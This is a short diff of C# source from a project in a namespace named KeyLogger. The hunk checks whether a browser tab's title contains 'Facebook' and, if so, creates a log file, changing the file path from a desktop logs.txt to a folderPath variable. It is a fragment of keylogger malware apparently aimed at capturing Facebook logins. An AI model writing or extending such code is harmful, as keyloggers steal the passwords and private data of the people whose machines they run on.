@@ -155,9 +155,8 @@ namespace KeyLogger
                     {
                         if (tabitem.Current.Name.Contains("Facebook"))
                         {
-                            string filePath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"//logs.txt";
 
-                            File.Create(filePath).Close();
+                            File.Create(folderPath).Close();
                             return true;
                         }
                     }
